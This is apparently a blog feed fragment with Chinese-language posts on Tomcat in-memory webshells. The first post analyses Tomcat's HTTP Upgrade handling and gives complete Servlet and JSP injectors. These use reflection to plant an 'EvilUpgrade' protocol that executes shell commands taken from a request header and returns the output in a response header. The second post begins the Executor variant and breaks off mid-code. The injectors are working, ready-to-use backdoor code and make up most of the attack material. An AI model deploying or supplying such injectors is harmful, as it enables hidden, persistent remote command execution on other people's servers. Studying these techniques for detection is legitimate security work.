        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>中间件型内存马Upgrade依旧还是基于Connector的内存马注入，在中间件型内存马Executor中，利用的是ProtocolHandler中的Endpoint里的Executor组件，而Upgrade利用的是ProtocolHandler的另一个组成部分，即Processor里的Upgrade组件。</p><p><img src="/2024/05/18/Tomcat-Upgrade/1.png"></p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>Processor是一个接口，针对的不同协议，有着不同的具体实现类，由于采用的是HTTP协议，因此来看看org.apache.coyote.http11.Http11Processor。</p><p><img src="/2024/05/18/Tomcat-Upgrade/2.png"></p><p>Http11Processor在处理Upgrade时，会执行以下的步骤：</p><ul><li>Http11Processor#service方法会检查请求头中的Connection字段的值是否包含upgrade；</li><li>若请求头中的Connection字段的值包含upgrade，则会调用request#getHeader方法来获取请求头Upgrade，并根据获取到的结果来选择对应的Upgrade对象；</li><li>当upgradeProtocol不为空时，调用该对象的accept方法。</li></ul><p>因此，可以尝试在accept方法中插入恶意代码来达到命令执行的目的。</p><p><img src="/2024/05/18/Tomcat-Upgrade/3.png"></p><p>接下来看看httpUpgradeProtocols是怎么获取的，在Http11Processor初始化阶段，会对httpUpgradeProtocols赋值。</p><p><img src="/2024/05/18/Tomcat-Upgrade/4.png"></p><p>而在org.apache.coyote.http11.AbstractHttp11Protocol#createProcessor方法中会实例化一个Http11Processor对象，将httpUpgradeProtocols传入。</p><p><img src="/2024/05/18/Tomcat-Upgrade/5.png"></p><p>继续跟进看看org.apache.coyote.http11.AbstractHttp11Protocol中在何处对httpUpgradeProtocols进行了赋值，跟进org.apache.coyote.http11.AbstractHttp11Protocol#configureUpgradeProtocol方法，这里将httpUpgradeName和upgradeProtocol添加到httpUpgradeProtocols的HashMap中。</p><p><img src="/2024/05/18/Tomcat-Upgrade/6.png"></p><p>因此，通过反射调用将httpUpgradeProtocols添加一项，即可实现Upgrade内存马。通过下断点，找到一处httpUpgradeProtocols，实现路径request-&gt;request-&gt;connector-&gt;protocolHandler-&gt;httpUpgradeProtocols。</p><p><img src="/2024/05/18/Tomcat-Upgrade/7.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注册Upgrade内存马的具体思路如下:</p><ul><li>获取httpUpgradeProtocols属性；</li><li>创建一个恶意的upgradeProtocol；</li><li>将恶意的upgradeProtocol插入到httpUpgradeProtocols中。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11NioProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.SocketWrapperBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;UpgradeMemoryShellServlet&quot;, value = &quot;/UpgradeMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpgradeMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request1</span> <span class="operator">=</span> getField(request, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) getField(request1, <span class="string">&quot;connector&quot;</span>);</span><br><span class="line">            <span class="type">Http11NioProtocol</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> (Http11NioProtocol) getField(connector, <span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">httpUpgradeProtocols</span> <span class="operator">=</span> (HashMap) getField(protocolHandler, <span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">            httpUpgradeProtocols.put(<span class="string">&quot;H3rmesk1t&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilUpgrade</span>());</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;Upgrade Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSecure)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(Adapter adapter, Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(Request request)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;set-reference&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(request, <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(output.getBytes(), StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Upgrade/8.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">EvilUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSecure)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(Adapter adapter, Request request)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(Request request)</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;set-reference&quot;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">          <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">          <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(request, <span class="string">&quot;response&quot;</span>);</span><br><span class="line">          response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(output.getBytes(), StandardCharsets.UTF_8));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">    <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        clazz = clazz.getSuperclass();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Object</span> <span class="variable">request1</span> <span class="operator">=</span> getField(request, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">  <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) getField(request1, <span class="string">&quot;connector&quot;</span>);</span><br><span class="line">  <span class="type">Http11NioProtocol</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> (Http11NioProtocol) getField(connector, <span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">  <span class="type">HashMap</span> <span class="variable">httpUpgradeProtocols</span> <span class="operator">=</span> (HashMap) getField(protocolHandler, <span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">  httpUpgradeProtocols.put(<span class="string">&quot;H3rmesk1t&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilUpgrade</span>());</span><br><span class="line">  response.getWriter().println(<span class="string">&quot;Upgrade Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Upgrade/9.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Executor</title>
      <link href="/2024/05/18/Tomcat-Executor/"/>
      <url>/2024/05/18/Tomcat-Executor/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>之前学习的传统Web应用型内存马都是基于Container的，本文来学习一下基于Connector的内存马注入。</p><p>下图中展示了Connector的构成，Connector主要由ProtocolHandler与Adapter构成，ProtocolHandler主要由Endpoint与Processor组成。</p><p><img src="/2024/05/18/Tomcat-Executor/1.png"></p><p>ProtocolHandler分类如下：</p><p><img src="/2024/05/18/Tomcat-Executor/2.png"></p><p>Endpoint是ProtocolHandler的组成之一，而NioEndpoint是Http11NioProtocl中的实现。Endpoint五大组件：</p><ul><li><p>LimitLatch：连接控制器，负责控制最大的连接数，如果超过了此连接，Tomcat会将此连接线程阻塞等待，等里面有其他连接释放了再消费此连接；</p></li><li><p>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller；</p></li><li><p>Poller：可以将其看成是Nio中Selector，负责监控Channel的状态；</p></li><li><p>SocketProcessor：可以看成是一个被封装的任务类；</p></li><li><p>Executor：Tomcat自己扩展的线程池，用来执行任务类。</p></li></ul><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>跟进一下Executor组件，跟进一下其execute方法在哪实现的。</p><p><img src="/2024/05/18/Tomcat-Executor/3.png"></p><p>跟进org.apache.catalina.core.StandardThreadExecutor#execute方法，当executor不为null时，其会调用executor的execute方法。</p><p><img src="/2024/05/18/Tomcat-Executor/4.png"></p><p>跟进org.apache.tomcat.util.threads.ThreadPoolExecutor#execute方法，因此，假设能创建一个继承ThreadPoolExecutor的恶意Executor，并重写其中的execute方法，那么在调用该方法的时候将能够执行恶意代码。</p><p><img src="/2024/05/18/Tomcat-Executor/5.png"></p><p>有了上面的思路，现在的重点在于如何将属性executor设置为创建的恶意Executor。跟进org.apache.tomcat.util.net.AbstractEndpoint#setExecutor方法，利用该方法可以将原本的Exector置换为创建的恶意Exector。</p><p><img src="/2024/05/18/Tomcat-Executor/6.png"></p><p>现在知道了如何创建恶意的Executor和如何修改属性executor为恶意的Executor，获取Request和Response又成为了现在的重点，这里利用工具<a href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>来获取Request对象。搜索的语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Keyword&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">keys.add(<span class="keyword">new</span> <span class="title class_">Keyword</span>.Builder().setField_type(<span class="string">&quot;Response&quot;</span>).build());</span><br><span class="line">List&lt;Blacklist&gt; blacklists = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">blacklists.add(<span class="keyword">new</span> <span class="title class_">Blacklist</span>.Builder().setField_type(<span class="string">&quot;java.io.File&quot;</span>).build());</span><br><span class="line"><span class="type">SearchRequstByBFS</span> <span class="variable">searcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequstByBFS</span>(Thread.currentThread(),keys);</span><br><span class="line">searcher.setBlacklists(blacklists);</span><br><span class="line">searcher.setIs_debug(<span class="literal">true</span>);</span><br><span class="line">searcher.setMax_search_depth(<span class="number">20</span>);</span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p>利用该工具可以找到一处位于NioEndpoint中的nioChannels的appReadBufHandler，其中的Buffer存放着所需要的request（利用点不唯一）。</p><p><img src="/2024/05/18/Tomcat-Executor/7.png"></p><p>通过层层反射来获取Buffer的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;org.apache.tomcat.util.threads.TaskThread&#125; </span><br><span class="line">   ---&gt; group = &#123;java.lang.ThreadGroup&#125; </span><br><span class="line">    ---&gt; threads = &#123;class [Ljava.lang.Thread;&#125; </span><br><span class="line">     ---&gt; [<span class="number">14</span>] = &#123;java.lang.Thread&#125; </span><br><span class="line">       ---&gt; target = &#123;org.apache.tomcat.util.net.NioEndpoint$Poller&#125; </span><br><span class="line">        ---&gt; <span class="built_in">this</span>$<span class="number">0</span> = &#123;org.apache.tomcat.util.net.NioEndpoint&#125; </span><br><span class="line">         ---&gt; nioChannels = &#123;org.apache.tomcat.util.collections.SynchronizedStack&#125; </span><br><span class="line">          ---&gt; stack = &#123;class [Ljava.lang.Object;&#125; </span><br><span class="line">           ---&gt; [<span class="number">0</span>] = &#123;org.apache.tomcat.util.net.NioChannel&#125; </span><br><span class="line">            ---&gt; appReadBufHandler = &#123;org.apache.coyote.http11.Http11InputBuffer&#125; </span><br><span class="line">              ---&gt; request = &#123;org.apache.coyote.Request&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 